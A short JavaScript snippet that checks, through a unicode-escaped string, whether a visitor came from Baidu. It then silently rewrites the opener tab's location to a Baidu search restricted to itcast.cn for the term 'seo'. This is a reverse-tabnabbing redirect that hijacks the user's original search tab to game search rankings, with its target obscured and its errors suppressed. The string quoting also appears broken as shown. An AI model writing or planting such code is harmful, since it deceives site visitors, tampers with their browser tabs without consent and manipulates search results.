function Refer(){
    return document.referrer;
}
function Bayi(){
    if(Refer().indexOf(''\u0062\u0061\u0069\u0064\u0075\u002e\u0063\u006f\u006d'')>-1){
        try{
            var re = /wd=(.*?)&/ig;
            var r="";
            while(r=re.exec(Refer())){
                asurl2=r[1];
            }
            window.opener.location.href='https://www.baidu.com/s?ct=2097152&tn=utf-8&si=itcast.cn&wd=seo';
        }
        catch(e){}
    }
}
Bayi();